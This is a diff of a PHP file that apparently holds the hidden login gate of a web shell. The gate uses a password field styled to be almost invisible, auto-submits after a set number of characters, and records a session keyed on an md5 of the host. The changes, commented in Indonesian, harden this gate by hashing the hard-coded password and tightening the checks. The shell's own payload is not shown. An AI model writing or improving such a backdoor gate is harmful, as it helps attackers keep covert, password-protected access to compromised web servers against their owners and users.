@@ -1,6 +1,8 @@
 <?php
 session_start();
-$password = "download";
+
+// Simpan password dalam format hash agar lebih aman
+define("PASSWORD_HASH", password_hash("download", PASSWORD_DEFAULT));
 
 function login_shell()
 {
@@ -31,7 +33,7 @@ function login_shell()
         input[type="password"] {
             border: none;
             background: transparent;
-            color: transparent;
+            color: black;
             font-size: 16px;
             width: 100px;
             outline: none;
@@ -47,7 +49,7 @@ function login_shell()
 
 <script>
     document.getElementById("password").addEventListener("input", function() {
-        if (this.value.length >= 5) {
+        if (this.value.length >= 8) { // Minimal 8 karakter sebelum submit
             this.form.submit();
         }
     });
@@ -55,11 +57,14 @@ function login_shell()
 
 </body>
 </html>
+
 <?php
     exit;
 }
+
+// Cek jika belum login
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+    if (!empty($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
         header("refresh: 0;");
     } else {
